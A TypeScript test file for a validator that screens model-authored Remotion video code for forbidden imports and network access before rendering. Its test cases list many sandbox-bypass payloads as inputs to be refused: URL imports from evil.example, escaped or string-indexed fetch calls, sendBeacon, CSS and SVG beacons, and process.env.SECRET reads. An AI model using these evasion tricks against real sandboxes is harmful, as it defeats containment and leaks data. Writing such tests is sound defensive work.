import { describe, it, expect } from "vitest";
import { checkAuthoredFilm, extractTsx, authorFilm } from "../authored-film";

const good = (frames = 1800) => `
import React from 'react';
import { AbsoluteFill, useCurrentFrame, interpolate } from 'remotion';
export const AUTHORED_FRAMES = ${frames};
export const AuthoredFilm: React.FC = () => {
  const frame = useCurrentFrame();
  const p = interpolate(frame, [0, ${frames}], [0, 100]);
  return <AbsoluteFill style={{ background: '#fff' }}><div>{p}</div></AbsoluteFill>;
};
${"// padding to clear the minimum-size check.\n".repeat(20)}
`;

describe("checkAuthoredFilm: the MUST-NOT-TOUCH direction", () => {
  const withBody = (body: string) => good().replace("  return <AbsoluteFill", `  ${body}\n  return <AbsoluteFill`);

  it.each([
    [
      "a comment mentioning an import, above unrelated quoted copy",
      "// The engine used to export this from './legacy'.\n  const label = 'Sites logged, val: 180,000';",
    ],
    ["a template literal containing the word from next to a quote", "const q = `rows from 'the last quarter'`;"],
    ["an object key literally called from", "const range = { from: 0, to: 120 };"],
    ["a destructured binding called from", "const { from, to } = { from: 0, to: 12 };"],
    ["on-screen copy containing the word import", "const line = 'Import your data in one click';"],
    ["on-screen copy ENDING in the word import", 'const line = "one click import";'],
    ["on-screen copy ending in the word export", 'const line = "one click export";'],
    ["a string array holding the word from", "const words = ['from', 'to', 'via'];"],
    ["a regex literal containing a quote", "const Q = /it's/;"],
    ["a regex literal containing a slash", "const R = /x\\/\\//;"],
  ])("accepts %s", (_name, body) => {
    expect(checkAuthoredFilm(withBody(body), 1800)).toEqual({ ok: true });
  });

  it.each([
    ["an apostrophe in JSX text", "<h1>Your team's growth</h1>"],
    ["it's in JSX text", "<h1>It's live</h1>"],
  ])("accepts %s, which is ordinary marketing copy", (_name, jsx) => {
    const film = good().replace("<div>{p}</div>", `${jsx}<div>{p}</div>`);
    expect(checkAuthoredFilm(film, 1800)).toEqual({ ok: true });
  });

  it.each([
    ["a JSDoc header whose prose mentions an import", "/**\n * A film.\n * It used to export from './legacy'.\n */\nconst z = 2;"],
    ["a single-line block comment", "/* a note */\nconst z = 2;"],
  ])("accepts %s", (_name, body) => {
    expect(checkAuthoredFilm(withBody(body), 1800)).toEqual({ ok: true });
  });

  it("accepts import-shaped marketing copy inside a MULTILINE template literal", () => {
    const copy = ["const copy = `Move faster:", "  export data from 'HubSpot' in one click`;"].join("\n");
    expect(checkAuthoredFilm(withBody(copy), 1800)).toEqual({ ok: true });
  });

  it("refuses deeply nested valid TSX instead of throwing out of the gate", () => {
    const film = good().replace(
      "export const AUTHORED_FRAMES = 1800;",
      `export const AUTHORED_FRAMES = 1800;\nconst deep = ${"(".repeat(5000)}1${")".repeat(5000)};`,
    );
    let threw = false;
    let result: ReturnType<typeof checkAuthoredFilm> | null = null;
    try {
      result = checkAuthoredFilm(film, 1800);
    } catch {
      threw = true;
    }
    expect(threw).toBe(false);
    expect(result?.ok).toBe(false);
  });

  it("refuses a film the parser cannot read, rather than walking a recovery tree", () => {
    const r = checkAuthoredFilm(withBody("const broken = ((((;"), 1800);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error).toMatch(/^unparsable_film:/);
  });

  it("accepts a multi-line named import, which is ordinary formatting", () => {
    const film = good().replace(
      "import { AbsoluteFill, useCurrentFrame, interpolate } from 'remotion';",
      "import {\n  AbsoluteFill,\n  useCurrentFrame,\n  interpolate,\n} from 'remotion';",
    );
    expect(checkAuthoredFilm(film, 1800)).toEqual({ ok: true });
  });

  it("still refuses a real forbidden import under a comment that mentions one", () => {
    const film = withBody("// we do not export from 'axios' any more").replace(
      "import React from 'react';",
      "import React from 'react';\nimport axios from 'axios';",
    );
    const r = checkAuthoredFilm(film, 1800);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error).toBe("forbidden_import:axios");
  });

  it.each([
    ["a side-effect import", "import 'node:fs';"],
    ["a dynamic import", "const m = await import('node:https');"],
    ["a URL specifier", "import x from 'https://evil.example.com/x.js';"],
    ["a traversal that starts with an allowed segment", "import y from 'react/../../http';"],
    ["an import hidden behind a regex literal ending in //", "const RE = /x\\/\\//; import https from 'https';"],
    ["a URL import hidden the same way", "const RE = /x\\/\\//; import 'https://evil.example/p.js';"],
    ["an import after a semicolon on a shared line", "const a = 1; import fs from 'fs';"],
    ["an import between a '/*' string and a '*/' string", "const a = '/*';\nimport https from 'https';\nconst b = '*/';"],
    ["a URL import hidden the same way", "const a = '/*';\nimport 'https://evil.example/p.js';\nconst b = '*/';"],
    ["an import indented with a non-breaking space", "const s = 'x'\n\u00A0import https from 'https';"],
    ["the same with a URL specifier", "const s = 'x'\n\u00A0import 'https://evil.example/p.js';"],
    ["an import between two line comments carrying /* and */", "// a: /*\nimport https from 'https';\n// b: */"],
    ["an import between two regex character classes carrying /* and */", "const A = /[/*]/;\nimport https from 'https';\nconst B = /[*/]/;"],
    ["an import after a same-line block comment", "/* generated */ import 'react-dom';"],
    ["a URL import after a same-line block comment", "/* x */ import 'https://evil.example/p.js';"],
    ["a re-export of a module outside the allowlist", "export * from 'react-dom';"],
    ["a type-only import of a module outside the allowlist", "import type { A } from 'react-dom';"],
    ["an import-equals with a comment", 'import ReactDOM = require/*x*/("react-dom");'],
    ["a plain import-equals", 'import ReactDOM = require("react-dom");'],
    ["a dynamic import with a comment", 'const p = import/*x*/("react-dom");'],
    ["a require with a comment", 'const q = require/*x*/("react-dom");'],
    ["an import nested inside a function body", 'function f(){ return import("node:fs"); }'],
  ])("still refuses %s", (_name, line) => {
    const r = checkAuthoredFilm(good().replace("import React from 'react';", `import React from 'react';\n${line}`), 1800);
    expect(r.ok).toBe(false);
  });

  it.each([
    ["a re-export", "export * from 'react-dom';"],
    ["a type-only import", "import type { A } from 'react-dom';"],
    ["an import-equals", 'import ReactDOM = require("react-dom");'],
    ["a dynamic import", 'const p = import("react-dom");'],
    ["a require", 'const q = require("react-dom");'],
  ])("names the module it refused for %s, which proves the allowlist ran", (_name, line) => {
    const r = checkAuthoredFilm(good().replace("import React from 'react';", `import React from 'react';\n${line}`), 1800);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error).toBe("forbidden_import:react-dom");
  });
});

describe("checkAuthoredFilm", () => {
  it("accepts a well-formed film", () => {
    expect(checkAuthoredFilm(good(), 1800)).toEqual({ ok: true });
  });

  it("refuses a film whose declared length is not the one the composition will use", () => {
    const r = checkAuthoredFilm(good(1500), 1800);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error).toContain("frame_count_mismatch");
  });

  it.each([
    ["import fs from 'node:fs';", "forbidden_import"],
    ["import axios from 'axios';", "forbidden_import"],
  ])("refuses an import the sandbox does not have: %s", (line, expected) => {
    const r = checkAuthoredFilm(good().replace("import React from 'react';", `import React from 'react';\n${line}`), 1800);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error).toContain(expected);
  });

  it.each([
    ["const d = await fetch('https://x.ai/a.json');", "network access"],
    ["const f = new Function('return 1');", "function constructor"],
    ["const k = process.env.SECRET;", "process access"],
    ["const img = 'https://cdn.example.com/hero.png';", "remote media"],
    ["const t = 'Fast, simple — and cheap';", "em dash"],
  ])("refuses %s", (line, why) => {
    const r = checkAuthoredFilm(good() + `\n${line}\n`, 1800);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error).toContain(why.split(" ")[0]!);
  });

  it("refuses a film missing either required export", () => {
    expect(checkAuthoredFilm(good().replace("export const AuthoredFilm", "const AuthoredFilm"), 1800).ok).toBe(false);
    expect(checkAuthoredFilm(good().replace("export const AUTHORED_FRAMES", "const AUTHORED_FRAMES"), 1800).ok).toBe(false);
  });
});

describe("extractTsx", () => {
  it("takes the fenced block", () => {
    expect(extractTsx("here you go\n```tsx\nconst a = 1;\n```\nhope that helps")).toBe("const a = 1;");
  });
  it("falls back to the whole reply when the model skipped the fence", () => {
    expect(extractTsx("const a = 1;")).toBe("const a = 1;");
  });
  it("returns null for an empty reply", () => {
    expect(extractTsx("   ")).toBeNull();
  });
});

describe("authorFilm", () => {
  const input = { intake: { product_name: "P" }, targetFrames: 1800, technique: "rules", exemplar: "example" };

  it("returns the film when the model behaves", async () => {
    const r = await authorFilm(input, { complete: async () => "```tsx\n" + good() + "\n```" });
    expect(r.ok).toBe(true);
  });

  it("fails CLOSED on a model error, so the caller falls back", async () => {
    const r = await authorFilm(input, { complete: async () => { throw new Error("529 overloaded"); } });
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error).toContain("author_llm_error");
  });

  it("fails closed on an unsafe film rather than rendering it", async () => {
    const r = await authorFilm(input, { complete: async () => "```tsx\n" + good() + "\nfetch('https://x.ai');\n```" });
    expect(r.ok).toBe(false);
  });

  it("puts the intake and the technique in front of the model", async () => {
    let seen = "";
    await authorFilm({ ...input, intake: { product_name: "Okara" } }, {
      complete: async (_s, u) => { seen = u; return "```tsx\n" + good() + "\n```"; },
    });
    expect(seen).toContain("Okara");
    expect(seen).toContain("rules");
    expect(seen).toContain("1800 frames");
  });
});

describe("the holes a second review round found", () => {
  const good = (frames = 1800) => `
import React from 'react';
import { AbsoluteFill, useCurrentFrame } from 'remotion';
export const AUTHORED_FRAMES = ${frames};
export const AuthoredFilm: React.FC = () => <AbsoluteFill><div>{useCurrentFrame()}</div></AbsoluteFill>;
${"// padding to clear the minimum-size check.\n".repeat(20)}
`;

  it.each([
    ['import "fs";', "a side-effect import has no `from`"],
    ['import "https://evil.example.com/x.js";', "a URL specifier"],
    ["import http from 'react/../../http';", "a traversal that starts with an allowed segment"],
    ['export { a } from "node:net";', "a re-export"],
  ])("refuses %s (%s)", (line) => {
    const r = checkAuthoredFilm(good().replace("import React from 'react';", `import React from 'react';\n${line}`), 1800);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error).toContain("forbidden_import");
  });

  it("still accepts the two real imports, including a side-effect one", () => {
    expect(checkAuthoredFilm(good(), 1800).ok).toBe(true);
    expect(checkAuthoredFilm(good().replace("import React from 'react';", "import 'remotion';\nimport React from 'react';"), 1800).ok).toBe(true);
  });

  it("allows an em dash in a comment and still refuses one on screen", () => {
    const inComment = good().replace("import React from 'react';", "// a note — written for a human\nimport React from 'react';");
    expect(checkAuthoredFilm(inComment, 1800).ok).toBe(true);
    const onScreen = good().replace("<div>{useCurrentFrame()}</div>", "<div>Fast — and cheap</div>");
    const r = checkAuthoredFilm(onScreen, 1800);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error).toContain("em dash");
  });
});

describe("a film cannot become a beacon", () => {
  const good = (body: string) => `
import React from 'react';
import { AbsoluteFill, Img } from 'remotion';
export const AUTHORED_FRAMES = 1800;
export const AuthoredFilm: React.FC = () => <AbsoluteFill>${body}</AbsoluteFill>;
${"// padding to clear the minimum-size check.\n".repeat(20)}
`;

  it("refuses a concatenated URL that every text pattern misses", () => {
    const r = checkAuthoredFilm(good('<Img src={"ht" + "tps://cdn.example.com/a.png"} />'), 1800);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error).toContain("computed src");
  });

  it.each([
    ['<iframe src={u} />', "computed src"],
    ['<a href={"//evil.example.com"}>x</a>', "computed href"],
    ['<Img src="https://cdn.example.com/a.png" />', "forbidden"],
    ['<a href="//evil.example.com">x</a>', "absolute href"],
  ])("refuses %s", (body, expected) => {
    const r = checkAuthoredFilm(good(body), 1800);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error).toContain(expected);
  });

  it("refuses indexed global access, which spells fetch without writing it", () => {
    const r = checkAuthoredFilm(good('<div>{String(window["fe" + "tch"])}</div>'), 1800);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error).toContain("computed global");
  });

  it("still allows a film that draws everything, which is all a film needs", () => {
    expect(checkAuthoredFilm(good('<div style={{ color: "#111" }}>Hello</div>'), 1800).ok).toBe(true);
  });
});

describe("escapes and decoys", () => {
  const film = (body: string, decl = "export const AUTHORED_FRAMES = 1800;") => `
import React from 'react';
import { AbsoluteFill } from 'remotion';
${decl}
export const AuthoredFilm: React.FC = () => <AbsoluteFill>${body}</AbsoluteFill>;
${"// padding to clear the minimum-size check.\n".repeat(20)}
`;

  it.each([
    ["\\u0066etch('https://evil.example/c');", "escaped identifier"],
    ["new \\u0046unction('return 42')();", "escaped identifier"],
    ["navigator.sendBeacon('/x');", "network access"],
    ["const i = new Image();", "image loader"],
  ])("refuses %s", (line, why) => {
    const r = checkAuthoredFilm(film(`<div>{String(${JSON.stringify(line)})}</div>`) + `\n${line}\n`, 1800);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error).toContain(why.split(" ")[0]!);
  });

  it("a decoy declaration cannot satisfy the length check on behalf of the real one", () => {
    const decoyFirst = 'const s = "export const AUTHORED_FRAMES = 1800";\nexport const AUTHORED_FRAMES = 180000;';
    const r = checkAuthoredFilm(film("<div>x</div>", decoyFirst), 1800);
    expect(r.ok).toBe(false);
  });
});

describe("bypasses a reviewer verified by RUNNING them", () => {
  const film = (body: string, extra = "") => `
import React from 'react';
import { AbsoluteFill } from 'remotion';
export const AUTHORED_FRAMES = 1800;
export const AuthoredFilm: React.FC = () => <AbsoluteFill>${body}</AbsoluteFill>;
${extra}
${"// padding to clear the minimum-size check.\n".repeat(20)}
`;

  it.each([
    ['import"fs";', "no whitespace after import"],
    ['import{x}from"fs";', "no whitespace around from"],
    ['import fs from"fs";', "no space before the specifier"],
    ["import x from `fs`;", "a backtick specifier"],
  ])("refuses %s (%s)", (line) => {
    const r = checkAuthoredFilm(film("<div>x</div>", line), 1800);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.error).toContain("forbidden_import");
  });

  it.each([
    ["const a = \\u{66}etch;", "code-point escape"],
    ['const s = { backgroundImage: "url(https://evil.example/c)" };', "css url"],
    ['const a = new Audio("https://evil.example/c");', "audio loader"],
    ['const r = parent["fetch"]("https://evil.example/c");', "string-indexed call"],
    ['const el = <img {...{ src: "https://evil.example/a.js" }} />;', "inline-object spread"],
  ])("refuses %s (%s)", (line) => {
    const r = checkAuthoredFilm(film("<div>x</div>", line), 1800);
    expect(r.ok).toBe(false);
  });

  it("refuses a second binding of the frame count, however it is exported", () => {
    const sneaky = 'const AUTHORED_FRAMES2 = 1;\nconst AUTHORED_FRAMES = 180000;\nexport { AUTHORED_FRAMES };';
    const r = checkAuthoredFilm(`
import React from 'react';
import { AbsoluteFill } from 'remotion';
export const AUTHORED_FRAMES = 1800;
${sneaky}
export const AuthoredFilm: React.FC = () => <AbsoluteFill><div>x</div></AbsoluteFill>;
${"// padding.\n".repeat(20)}
`, 1800);
    expect(r.ok).toBe(false);
  });

  it("does NOT reject an ordinary object called data", () => {
    const r = checkAuthoredFilm(film("<div>x</div>", "const data = { rows: [1, 2, 3] };"), 1800);
    expect(r.ok).toBe(true);
  });

  it("does NOT reject spreading a variable, which every shot does", () => {
    const r = checkAuthoredFilm(film("<Shot {...props} />", "const props = { a: 1 };"), 1800);
    expect(r.ok).toBe(true);
  });
});

describe("round four: attacks that dodge by attribute NAME, and the films we wrongly refused", () => {
  const film = (body: string, extra = "") => `
import React from 'react';
import { AbsoluteFill, staticFile } from 'remotion';
export const AUTHORED_FRAMES = 1800;
export const AuthoredFilm: React.FC = () => <AbsoluteFill>${body}</AbsoluteFill>;
${extra}
${"// padding to clear the minimum-size check.\n".repeat(20)}
`;

  it.each([
    ['<svg><image xlinkHref="https://evil.example/p" /></svg>', "svg image href"],
    ['<svg><use xlinkHref="https://evil.example/p" /></svg>', "svg use href"],
    ['<object data="https://evil.example/p" />', "object data"],
    ['<style>{"@import \'https://evil.example/x.css\';"}</style>', "css import"],
  ])("refuses %s", (body) => {
    const r = checkAuthoredFilm(film(body), 1800);
    expect(r.ok).toBe(false);
  });

  it("accepts staticFile, which is the engine's OWN way to reference a bundled asset", () => {
    expect(checkAuthoredFilm(film('<img src={staticFile("logo.png")} alt="" />'), 1800).ok).toBe(true);
  });

  it("accepts an inline data: URI, which makes no request at all", () => {
    expect(checkAuthoredFilm(film('<img src="data:image/svg+xml;base64,PHN2Zy8+" alt="" />'), 1800).ok).toBe(true);
  });

  it("accepts a bullet or an arrow in the copy", () => {
    expect(checkAuthoredFilm(film('<div>{"\\u2022 one \\u2192 two"}</div>'), 1800).ok).toBe(true);
    expect(checkAuthoredFilm(film("<div>x</div>", "const a = \\u0066etch;"), 1800).ok).toBe(false);
  });

  it("accepts an ordinary helper whose name ends in Url", () => {
    expect(checkAuthoredFilm(film("<div>x</div>", "const buildUrl = (p: string) => p;"), 1800).ok).toBe(true);
  });
});

describe("the calm grammar is only granted a film long enough to hold it", () => {
  it("states the arithmetic that makes a short calm film a stall", async () => {
    const { CALM_MIN_SECONDS } = await import("@/services/launch-video-public/compose");
    expect(CALM_MIN_SECONDS).toBeGreaterThanOrEqual(2 * 25);
    expect(CALM_MIN_SECONDS).toBeGreaterThan(45);
  });
});
